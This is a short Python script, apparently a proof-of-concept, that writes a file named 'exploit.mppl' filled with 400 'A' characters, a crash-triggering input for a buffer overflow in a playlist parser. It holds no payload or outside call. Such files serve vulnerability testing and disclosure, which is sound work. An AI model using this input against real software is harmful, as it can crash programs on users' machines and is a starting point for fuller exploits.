#!/usr/bin/python

file = open("exploit.mppl", "wb")

buffer = "A"*400

file.write(buffer)

file.close()
